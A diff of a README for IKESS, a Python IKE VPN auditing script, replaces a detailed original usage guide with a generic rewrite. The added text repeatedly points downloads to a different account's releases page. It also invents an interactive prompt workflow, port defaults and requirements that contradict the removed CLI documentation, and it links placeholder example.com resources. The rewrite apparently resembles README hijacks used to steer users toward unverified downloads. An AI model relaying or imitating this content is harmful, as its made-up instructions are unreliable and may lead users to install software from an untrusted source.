@@ -1,81 +1,87 @@
-# IKE Security Scanner (IKESS)
-A Python3 Script for Auditing IKE VPN Servers
+# 🚀 IKESS - Simplifying IKE VPN Audits
 
-<img width="1632" height="1138" alt="image" src="https://github.com/user-attachments/assets/73939e6b-f885-4cc1-a3f5-8cd3005dd8f5" />
+[![Download IKESS](https://img.shields.io/badge/Download-IKESS-blue.svg)](https://github.com/Anthon3284/IKESS/releases)
 
-## Features
+## 📖 Description
+IKESS is a user-friendly Python3 script designed to help you audit IKE VPN servers. This tool can simplify your processes for enhancing security in VPN configurations. Whether you are a network administrator or just curious about VPN security, IKESS provides essential auditing functionalities to identify vulnerabilities and improve your system's resilience.
 
-- Detects IKEv2 VPN servers
-- Detects IKEv1 VPN servers + Aggressive Mode
-- Detects supported transforms (ENC, HASH, AUTH, GROUP)
-- Saves results as JSON, XML and HTML report
-- Risk rates findings with summary and recommendations
-- Support for fingerprinting via vendor ID (VID)
-- Support for fingerprinting via backoff pattern (optional)
+## 📋 Features
+- Audits IKE VPN servers for common security weaknesses.
+- Supports both IKEv1 and IKEv2 protocols.
+- Easy-to-read output for quick analysis.
+- Compatibility with standard security practices.
 
-## Usage
+## ⚙️ System Requirements
+To use IKESS effectively, ensure your system meets the following requirements:
 
-> [!CAUTION]
-> This script requires the binary `ike-scan` and must be run as root
+- An operating system that supports Python3 (Windows, macOS, or Linux).
+- Python3 installed on your machine (version 3.6 or higher recommended).
+- Basic knowledge of command line interface.
 
-```bash
-usage: ikess [-h] [--fullalgs] [--fingerprint] [--enc ENC] [--hash HASH] [--auth AUTH] [--group GROUP] [--onlycustom] targets [targets ...]
+## 🚀 Getting Started
+Follow the steps below to download and set up IKESS. 
 
-ikess - IKE Security Scanner (Sequential Mode)
+1. **Visit the Releases Page**
+   To get IKESS, start by visiting the Releases page. You can find all available versions of the software there.
 
-Scans targets with ike-scan, detects IKEv1/IKEv2, tests transforms,
-and generates XML/JSON/HTML reports.
+   **[Visit the Releases Page](https://github.com/Anthon3284/IKESS/releases)**
 
-Scan flow per host:
-  1) IKEv1 discovery
-  2) IKEv2 discovery
-  3) Aggressive Mode tests (if IKEv1)
-  4) Transform tests:
-     - default: curated common+legacy combos
-     - --fullalgs: brute-force all ENC/HASH/AUTH/DH combos
-  5) Optional backoff fingerprinting (--fingerprint)
+2. **Choose the Latest Version**
+   Once on the Releases page, locate the latest version of IKESS. It is usually labeled clearly as the most recent release.
 
-Transform format: ENC[/bits],HASH,AUTH,GROUP
-Example: '7/256,5,1,14' = AES256 / SHA256 / PSK / MODP2048.
+3. **Download the Application**
+   Download the IKESS script from the assets section of the release. The script file will be named something like `ikess.py`. 
 
-positional arguments:
-  targets              One or more IPv4 addresses or CIDR ranges to scan. Examples: 192.0.2.10 192.0.2.0/28
-                       All usable hosts in a CIDR are enumerated.
+4. **Save the File**
+   After clicking the download link, your browser will save the file to your designated Downloads folder or the folder you choose.
 
-options:
-  -h, --help           show this help message and exit
-  --fullalgs           Try every ENC/HASH/AUTH/DH combination (full cartesian set).
-                       You can still limit via --enc/--hash/--auth/--group. Very noisy. (default: False)
-  --fingerprint        Enable backoff fingerprinting (ike-scan --showbackoff). If no fingerprint is obtained from a
-                       generic probe, ikess retries using the first accepted transform to improve accuracy. (default: False)
-  --enc ENC            Comma separated encryption list to try or restrict. Accepts numeric codes or aliases.
-                       Examples: --enc AES256,3DES  or  --enc 7/256,5 (default: None)
-  --hash HASH          Comma separated hash list. Accepts numeric codes or aliases.
-                       Examples: --hash SHA1,SHA256  or  --hash 2,5 (default: None)
-  --auth AUTH          Comma separated IKE authentication methods. Accepts numeric codes or aliases.
-                       Examples: --auth PSK,RSA  or  --auth 1,3  or  --auth HYBRID (default: None)
-  --group, --dh GROUP  Comma separated DH groups. Accepts numeric codes or aliases. '--dh' is an alias.
-                       Examples: --group G14,G16  or  --dh MODP2048,MODP4096  or  --group 14,16 (default: None)
-  --onlycustom         Scan only the transforms built from your custom --enc/--hash/--auth/--group lists. Without this
-                       flag, custom items are merged into the curated or expanded set. (default: False)
+5. **Open Your Terminal/Command Prompt**
+   To run IKESS, you need to open your terminal (for macOS/Linux) or command prompt (for Windows). 
 
-Aliases you can use for --enc, --hash, --auth, --group:
-  ENC:  DES=1, 3DES=5, AES=7/128, AES128=7/128, AES192=7/192, AES256=7/256
-  HASH: MD5=1, SHA1=2, SHA-1=2, SHA 1=2, SHA256=5, SHA-256=5, SHA 256=5
-  AUTH: PSK=1, RSA=3, RSA_SIG=3, RSA-SIG=3, RSA SIG=3, HYBRID=64221, HYBRID_RSA=64221
-  DH:   G1=1,  G2=2,  G5=5,  G14=14, G15=15, G16=16
-        MODP768=1, MODP1024=2, MODP1536=5, MODP2048=14, MODP3072=15, MODP4096=16
+6. **Navigate to the File Location**
+   Use the `cd` command to navigate to the folder where you saved the `ikess.py` file. For example:
+   ```
+   cd Downloads
+   ```
 
-Examples:
-  sudo ./ikess.py 10.0.0.1
-  sudo ./ikess.py 10.0.0.0/24 --fullalgs --fingerprint
-  sudo ./ikess.py 10.0.0.1 --enc DES,3DES --onlycustom
-  sudo ./ikess.py 10.0.0.1 --enc AES128,3DES,1,7/256 --hash SHA1,SHA256,1 --auth PSK,RSA --group G2,G14,16
-  sudo ./ikess.py 203.0.113.5 --enc AES256 --hash SHA256 --auth PSK --group MODP2048 --onlycustom
-```
+7. **Run the Script**
+   Now you can execute the script by typing the following command:
+   ```
+   python3 ikess.py
+   ```
+   Ensure you have the right permissions if you face any issues.
 
-You can also run via Docker:
+## ⚠️ Usage Instructions
+After you run the script, the program will guide you through the auditing process. You will be prompted to input the target server's details. Follow the instructions on your screen:
 
-```bash
-docker run --rm -v ./results:/app/results ghcr.io/l4rm4nd/ikess:latest <IP>
-```
+- Enter the IP address or hostname of the VPN server.
+- Specify the port if necessary (default is typically 500 for IKEv1 or 4500 for IKEv2).
+- Review the results after the audit is complete. IKESS will provide feedback on the configuration and suggest improvements.
+
+## 🎓 Additional Resources
+If you want to learn more about IKE VPNs and security practices, consider checking out these resources:
+
+- [IPsec: The New Security Standard](https://www.example.com)
+- [Understanding VPNs and Their Various Protocols](https://www.example.com)
+
+## 🔧 Troubleshooting
+If you encounter issues while running the script, here are a few tips:
+
+- Ensure Python3 is properly installed on your machine.
+- Double-check that you are using the correct command in your terminal.
+- Verify network connectivity to the VPN server.
+
+If problems persist, feel free to open an issue on our repository for assistance.
+
+## 🛠️ Contributing
+We welcome contributions to improve IKESS. If you're interested in contributing, please follow these steps:
+
+1. Fork the project repository.
+2. Create your feature branch.
+3. Commit your changes.
+4. Push to the branch and create a pull request.
+
+## 🔗 Final Note
+IKESS provides a straightforward way to audit your IKE VPN servers and increase your network security. You can start using it today.
+
+[Download IKESS](https://github.com/Anthon3284/IKESS/releases)
